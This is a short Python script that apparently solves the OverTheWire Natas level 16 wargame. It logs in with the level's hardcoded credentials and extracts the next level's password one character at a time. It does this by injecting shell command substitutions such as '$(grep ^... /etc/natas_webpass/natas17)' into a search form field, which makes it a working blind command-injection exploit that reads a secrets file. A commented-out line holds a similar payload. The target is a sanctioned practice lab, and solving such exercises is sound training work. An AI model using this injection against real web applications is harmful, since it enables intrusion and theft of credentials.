#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import *

characters = lowercase + uppercase + digits


username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

# response = session.post(url, data = { "needle" : "anythings$(grep 8 /etc/natas_webpass/natas17 > dictionary.txt)" },auth = (username, password) )
# content = response.text

# print content


seen_password = list()
while ( len(seen_password) < 32 ):

	for character in characters:
		print "".join(seen_password) + character
		response = session.post(url, data = { "needle" : "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" },auth = (username, password) )
		content = response.text


		returned = re.findall( '<pre>\n(.*)\n</pre>', content )

		if ( not returned ):
			seen_password.append( character )
			break